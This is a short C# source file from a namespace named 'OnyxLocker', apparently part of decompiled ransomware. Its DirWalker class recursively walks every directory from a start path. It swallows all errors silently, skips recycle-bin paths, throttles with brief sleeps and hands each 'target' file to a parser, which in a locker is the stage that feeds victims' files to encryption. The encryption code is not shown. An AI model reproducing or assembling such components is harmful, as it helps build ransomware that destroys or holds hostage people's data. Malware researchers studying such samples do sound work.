using System.IO;
using System.Threading;

namespace OnyxLocker;

internal class DirWalker
{
	private IFileChecker FileChecker { get; set; }

	private IFileParser FileParser { get; set; }

	public DirWalker(IFileChecker fileChecker, IFileParser fileParser)
	{
		FileChecker = fileChecker;
		FileParser = fileParser;
	}

	public void TraverseDirectories(string startDirectory)
	{
		try
		{
			string[] files = Directory.GetFiles(startDirectory);
			for (int i = 0; i < files.Length; i++)
			{
				ProcessFile(files[i].ToLower());
				Thread.Sleep(1);
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(startDirectory);
			foreach (string startDirectory2 in directories)
			{
				TraverseDirectories(startDirectory2);
				Thread.Sleep(1);
			}
		}
		catch
		{
		}
	}

	private void ProcessFile(string filePath)
	{
		if (IsTargetFile(filePath))
		{
			FileParser.ParseFile(filePath);
		}
	}

	private bool IsTargetFile(string filePath)
	{
		if (!filePath.Contains("recycle"))
		{
			return FileChecker.IsTargetFile(filePath);
		}
		return false;
	}
}
